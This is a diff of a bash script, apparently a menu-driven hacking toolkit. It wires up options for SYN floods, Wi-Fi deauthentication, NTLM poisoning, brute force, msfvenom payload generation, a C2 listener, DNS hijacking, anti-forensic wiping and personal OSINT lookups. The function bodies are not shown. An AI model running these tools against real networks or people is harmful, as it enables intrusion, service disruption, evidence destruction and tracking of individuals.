-            T|t) echo -ne "    Domain: "; read t; bash "$0" takeover "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            V|v) echo -ne "    Target IP: "; read t; bash "$0" brute "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            R|r) echo -ne "    Hash File: "; read t; bash "$0" crack "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            Q|q) echo -ne "    Your LHOST IP: "; read t; bash "$0" payload "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            Y|y) echo -ne "    File/Dir: "; read t; bash "$0" yara "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            Z|z) echo -ne "    Port to trap: "; read t; bash "$0" honeypot "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '=') echo -ne "    Domain: "; read t; bash "$0" origin "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '&') echo -ne "    Company Domain: "; read t; bash "$0" employees "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '^') echo -ne "    Domain: "; read t; bash "$0" supply "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            ',') echo -ne "    Org Name: "; read t; bash "$0" dorks "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '.') echo -ne "    Target URL: "; read t; bash "$0" secrets_deep "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '/') echo -ne "    Internal IP: "; read t; bash "$0" internal "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '@') anti_forensics; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '#') c2_listener; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '$') dns_hijack; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            '~') bt_recon; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            S|s) bash "$0" sniff; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            M|m) bash "$0" mac; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
             U|u) if [ "$BLUR_IP" = true ]; then BLUR_IP=false; else BLUR_IP=true; fi ;;
-            !) echo -ne "    Message: "; read t; discord_notify "$t"; echo -e "\n\e[1;32m[+] Notification Sent.\e[0m"; sleep 1 ;;
+            M|m) ghost_mode; echo -e "\n${NEON_BLUE}[!] Task Complete. Press Enter...${RESET}"; read ;;
             X|x) exit 0 ;;
-            *) echo -e "\e[1;31m    Invalid.\e[0m"; sleep 1 ;;
+        esac
+    done
+}
+
+gui_ethernet() {
+    while true; do
+        show_banner
+        echo -e " ${NEON_BLUE}┌─ ETHERNET & INTERNAL OPERATIONS ────────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [K] GHOST INSERT    [R] RESTORE LINK    [{] DIRECT-LINK DIS ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [<] NAC BYPASS      [\"] NTLM POISON     [?] GATEWAY HUNT    ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [}] SHARE HUNTER    [|] WPAD AUDIT      [/] INTERNAL ENUM   ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [>] PROTOCOL AUDIT  [%] VLAN RECON      [^] SNMP INFRA MAP  ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
+        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
+        read sub; if [[ "$sub" == "b" ]]; then return; fi
+        case $sub in
+            K|k) ghost_insertion; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            R|r) ghost_restore; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '{') direct_link_disco; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '<') nac_bypass; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '"') ntlm_poison; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '?') gateway_hunt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '}') echo -ne "    Target IP: "; read t; bash "$0" shares "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '|') wpad_audit; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '/') echo -ne "    Internal IP: "; read t; bash "$0" internal "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '>') protocol_audit; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '%') vlan_hop_recon; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '^') echo -ne "    Target IP: "; read t; bash "$0" snmp "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+        esac
+    done
+}
+
+gui_web_intel() {
+    while true; do
+        show_banner
+        echo -e " ${NEON_BLUE}┌─ WEB & INFRASTRUCTURE INTEL ────────────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [1] AUTO-PILOT      [2] REMOTE INTEL    [3] JS ANALYSIS     ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [4] DNS HISTORY     [5] CMS DETECT      [6] CLOUD RECON     ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [7] SUBDOMAIN MAP   [8] RUST PORT SCAN  [9] SHODAN INTEL    ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [=] ORIGIN DISCOVER [,] GITHUB DORKS    [*] ASN/BGP MAPPER  ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
+        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
+        read sub; if [[ "$sub" == "b" ]]; then return; fi
+        case $sub in
+            1) echo -ne "    Target: "; read t; bash "$0" auto "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            2) echo -ne "    Target: "; read t; bash "$0" remote "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            3) echo -ne "    Target: "; read t; bash "$0" js "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            4) echo -ne "    Target: "; read t; bash "$0" history "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            5) echo -ne "    Target: "; read t; bash "$0" cms "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            6) echo -ne "    Keyword: "; read t; bash "$0" cloud "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            7) echo -ne "    Domain: "; read t; bash "$0" subfinder "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            8) echo -ne "    Target IP: "; read t; bash "$0" rustscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            9) echo -ne "    Target IP: "; read t; bash "$0" shodan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '=') echo -ne "    Domain: "; read t; bash "$0" origin "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            ',') echo -ne "    Org Name: "; read t; bash "$0" dorks "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '*') echo -ne "    ASN: "; read t; bash "$0" asn "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+        esac
+    done
+}
+
+gui_deep_search() {
+    while true; do
+        show_banner
+        echo -e " ${NEON_BLUE}┌─ DEEP SEARCH & OSINT HUB ───────────────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [A] EMAIL (HOLEHE)  [B] PHONE (INFOGA)  [C] USER (SHERLOCK) ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [D] METADATA (EXIF) [E] DARK WEB SEARCH [P] BREACH SEARCH   ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [&] EMPLOYEE RECON  [.] API SECRETS     [+] SECRETS SCAN    ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [!] DEAD DROP NOTIF                                         ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
+        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
+        read sub; if [[ "$sub" == "b" ]]; then return; fi
+        case $sub in
+            A|a) echo -ne "    Email: "; read t; bash "$0" email "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            B|b) echo -ne "    Phone: "; read t; bash "$0" phone "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            C|c) echo -ne "    Username: "; read t; bash "$0" user "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            D|d) echo -ne "    File/URL: "; read t; bash "$0" file "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            E|e) echo -ne "    Keyword: "; read t; bash "$0" dark "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            P|p) echo -ne "    Email/User: "; read t; bash "$0" breach "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '&') echo -ne "    Company Domain: "; read t; bash "$0" employees "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '.') echo -ne "    Target URL: "; read t; bash "$0" secrets_deep "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '+') echo -ne "    Git URL: "; read t; bash "$0" secrets "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '!') echo -ne "    Message: "; read t; discord_notify "$t"; echo -e "\n${NEON_BLUE}[+] Sent.${RESET}"; sleep 1 ;;
+        esac
+    done
+}
+
+gui_warfare() {
+    while true; do
+        show_banner
+        echo -e " ${NEON_BLUE}┌─ CYBER WARFARE OPERATIONS ──────────────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [F] MULTI-FLOOD     [G] AGGRESSIVE ARP  [H] KILL CONNECTION ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [I] WI-FI DEAUTH    [J] VULN SCAN (NUC) [L] WEB FUZZ (FFUF) ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [N] SQL INJECT TEST [Y] MALWARE (YARA)  [Z] DEPLOY HONEYPOT ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [T] TAKEOVER AUDIT  [V] BRUTE FORCE     [R] HASH CRACKER    ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [Q] PAYLOAD GEN     [@] GHOST WIPE      [#] C2 LISTENER     ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [$] DNS HIJACK      [W] WP AUDIT        [S] SNIFFER         ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
+        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
+        read sub; if [[ "$sub" == "b" ]]; then return; fi
+        case $sub in
+            F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            G|g) bash "$0" arp; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            H|h) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            I|i) echo -ne "    BSSID: "; read t; bash "$0" deauth "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            L|l) echo -ne "    URL: "; read t; bash "$0" fuzz "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            N|n) echo -ne "    URL with ID: "; read t; bash "$0" sqlmap "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            Y|y) echo -ne "    File/Dir: "; read t; bash "$0" yara "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            Z|z) echo -ne "    Port: "; read t; bash "$0" honeypot "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            T|t) echo -ne "    Domain: "; read t; bash "$0" takeover "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            V|v) echo -ne "    Target IP: "; read t; bash "$0" brute "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            R|r) echo -ne "    Hash File: "; read t; bash "$0" crack "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            Q|q) echo -ne "    LHOST IP: "; read t; bash "$0" payload "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '@') anti_forensics; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '#') c2_listener; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            '$') dns_hijack; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            W|w) echo -ne "    WP URL: "; read t; bash "$0" wpscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            S|s) bash "$0" sniff; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
         esac
     done
 }
@@ -321,6 +522,27 @@ grim_gui() {
 TOR_PROXY="socks5h://127.0.0.1:9050"
 USE_TOR=false
 STEALTH_DELAY=0
+
+# --- SAFETY EXIT TRAP ---
+cleanup_on_exit() {
+    # Only run cleanup if we are in the main GUI session (no arguments passed)
+    if [ -z "$1" ] || [ "$1" == "EXIT" ]; then
+        local INTERFACE=$(ip link | grep -E "eth|enp|wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+        if [ ! -z "$INTERFACE" ]; then
+            if [[ $(ip link show $INTERFACE | grep "PROMISC") ]] || [[ $(cat /proc/sys/net/ipv6/conf/$INTERFACE/disable_ipv6) -eq 1 ]]; then
+                echo -e "\n${NEON_BLUE}[!] SESSION CLOSED. AUTO-RESTORING LINK...${RESET}"
+                # Use a simpler restore in the trap to ensure it finishes fast
+                sudo ip link set dev $INTERFACE promisc off
+                sudo sysctl -w net.ipv6.conf.$INTERFACE.disable_ipv6=0 > /dev/null
+                sudo macchanger -p $INTERFACE > /dev/null 2>&1
+                sudo ip link set dev $INTERFACE up
+                sudo dhclient -nw $INTERFACE > /dev/null 2>&1 # Non-blocking DHCP
+            fi
+        fi
+    fi
+}
+trap 'cleanup_on_exit EXIT' EXIT
+trap 'exit 0' SIGINT SIGTERM # Redirect signals to the EXIT trap
 
 # 1. LOGGING & POST-EXTRACTION WRAPPER
 if [ -z "$1" ]; then
@@ -332,9 +554,10 @@ if [ "$1" != "--no-log" ]; then
     if [ -z "$TARGET_CLEAN" ] || [ "$1" == "help" ] || [ "$1" == "man" ]; then
         TARGET="help"
     else
-        LOGFILE="lol_report_${TARGET_CLEAN}.txt"
-        JSON_REPORT="lol_intel_${TARGET_CLEAN}.json"
-        echo -e "\e[1;32m[+] Session active: Logging to $LOGFILE\e[0m"
+        SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+        LOGFILE="${SCRIPT_DIR}/lol_report_${TARGET_CLEAN}.txt"
+        JSON_REPORT="${SCRIPT_DIR}/lol_intel_${TARGET_CLEAN}.json"
+        echo -e "${NEON_BLUE}[+] Session active: Logging to $LOGFILE${RESET}"
         bash "$0" --no-log "$@" 2>&1 | tee >(sed -r 's/\x1b\[[0-9;]*m//g' > "$LOGFILE")
         
         # Post-session automated intelligence extraction
@@ -380,10 +603,10 @@ TARGET=$1
 EXTRA=$2
 
 if [ -z "$TARGET" ] || [ "$TARGET" == "help" ]; then
-    echo -e "\e[1;34m========================================================\e[0m"
-    echo -e " \e[1;37mPOTENCY COMMAND CENTER - USAGE GUIDE\e[0m"
-    echo -e "\e[1;34m========================================================\e[0m"
-    echo -e "\e[1;33mULTIMATE POTENCY MODES:\e[0m"
+    echo -e "${NEON_BLUE}========================================================${RESET}"
+    echo -e " ${NEON_BLUE}POTENCY COMMAND CENTER - USAGE GUIDE${RESET}"
+    echo -e "${NEON_BLUE}========================================================${RESET}"
+    echo -e "${NEON_BLUE}ULTIMATE POTENCY MODES:${RESET}"
     echo -e "  auto      - Ultimate Auto-Pilot (Remote Intel -> Recon -> Vuln -> JS Analysis)."
     echo -e "  remote    - Deep Remote Intelligence Gathering (Passive)."
     echo -e "  js        - Extract API keys, endpoints, and secrets from JavaScript."
@@ -391,7 +614,7 @@ if [ -z "$TARGET" ] || [ "$TARGET" == "help" ]; then
     echo -e "  exploit   - Search remote databases (Vulners/ExploitDB) for versions."
     echo -e "  flood     - High-intensity TCP SYN flood (Remote/Local)."
     echo -e "  arp       - Aggressive ARP scanning and discovery."
-    echo -e "\e[1;33mSTANDARD MODES:\e[0m"
+    echo -e "${NEON_BLUE}STANDARD MODES:${RESET}"
     echo -e "  <Domain/IP/Phone/Email/User/File/Scan/Cloud/Web/Vuln/CMS/Net/Sniff/Kill/Mac>"
     exit 0
 fi
@@ -429,6 +652,12 @@ elif [[ "$TARGET" == "supply" ]]; then TYPE="SUPPLY"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "dorks" ]]; then TYPE="DORKS"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "secrets_deep" ]]; then TYPE="SECRETS_DEEP"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "internal" ]]; then TYPE="INTERNAL"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "direct" ]]; then TYPE="DIRECT"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "shares" ]]; then TYPE="SHARES"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "wpad" ]]; then TYPE="WPAD"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "protocol" ]]; then TYPE="PROTOCOL"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "vlan" ]]; then TYPE="VLAN"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "snmp" ]]; then TYPE="SNMP"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "brute" ]]; then TYPE="BRUTE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "crack" ]]; then TYPE="CRACK"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "payload" ]]; then TYPE="PAYLOAD"; TARGET=$EXTRA;
@@ -449,7 +678,7 @@ fi
 
 case $TYPE in
     AUTO)
-        echo -e "\e[1;31m[!] AUTO-PILOT ENGAGED\e[0m"
+        echo -e "${NEON_PINK}[!] AUTO-PILOT ENGAGED${RESET}"
         api_intel "$TARGET"
         sub_discover "$TARGET"
         rust_scan "$TARGET"
@@ -459,11 +688,11 @@ case $TYPE in
         ;;
     REMOTE) api_intel "$TARGET" ;;
     HISTORY)
-        echo -e "\e[1;33m[*] Fetching History for $TARGET...\e[0m"
+        echo -e "${NEON_BLUE}[*] Fetching History for $TARGET...${RESET}"
         req "https://viewdns.info/iphistory/?domain=$TARGET" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u ;;
     JS) js_intel "$TARGET" ;;
     DARK)
-        echo -e "\e[1;31m[!] DARK WEB SEARCH: $TARGET\e[0m"
+        echo -e "${NEON_PINK}[!] DARK WEB SEARCH: $TARGET${RESET}"
         req "https://ahmia.fi/search/?q=$TARGET" | grep -oE "http[s]?://[a-z2-7]{56}\.onion" | sort -u ;;
     IP) api_intel "$TARGET"; rust_scan "$TARGET" ;;
     DOMAIN) api_intel "$TARGET"; sub_discover "$TARGET" ;;
@@ -486,6 +715,12 @@ case $TYPE in
     DORKS) github_dork "$TARGET" ;;
     SECRETS_DEEP) api_deep_extract "$TARGET" ;;
     INTERNAL) internal_enum "$TARGET" ;;
+    DIRECT) direct_link_disco ;;
+    SHARES) share_hunter "$TARGET" ;;
+    WPAD) wpad_audit ;;
+    PROTOCOL) protocol_audit ;;
+    VLAN) vlan_hop_recon ;;
+    SNMP) snmp_map "$TARGET" ;;
     BRUTE) hydra_brute "$TARGET" ;;
     CRACK) hash_crack "$TARGET" ;;
     PAYLOAD) msf_venom "$TARGET" ;;
@@ -505,4 +740,4 @@ case $TYPE in
     MAC) ghost_mode ;;
 esac
 
-echo -e "\n\e[1;34m========================================================\e[0m"
+echo -e "\n${NEON_BLUE}========================================================${RESET}"
